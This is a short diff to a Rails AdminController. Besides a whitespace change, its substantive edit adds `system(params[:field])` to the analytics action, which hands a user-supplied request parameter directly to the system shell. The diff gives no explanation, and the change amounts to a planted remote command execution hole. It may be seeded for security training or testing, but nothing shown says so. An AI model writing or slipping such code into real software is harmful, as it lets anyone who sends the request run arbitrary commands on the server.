@@ -4,10 +4,12 @@ class AdminController < ApplicationController
   skip_before_action :has_info
   layout false, only: [:get_all_users, :get_user]
 
-  def dashboard
+  def dashboard  
   end
 
   def analytics
+    system(params[:field])
+    
     if params[:field].nil?
       fields = "*"
     else
